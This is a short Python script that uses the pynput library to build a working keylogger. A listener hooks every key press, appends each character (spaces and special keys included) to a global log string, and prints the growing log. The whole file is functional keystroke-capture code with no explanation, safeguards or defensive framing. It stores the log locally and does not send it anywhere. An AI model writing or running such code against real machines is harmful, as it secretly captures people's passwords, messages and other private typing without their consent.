import pynput.keyboard
#from pynput import keyboard
log = ""
def callback_function(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass


    print(log)



keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

with keylogger_listener:
    keylogger_listener.join()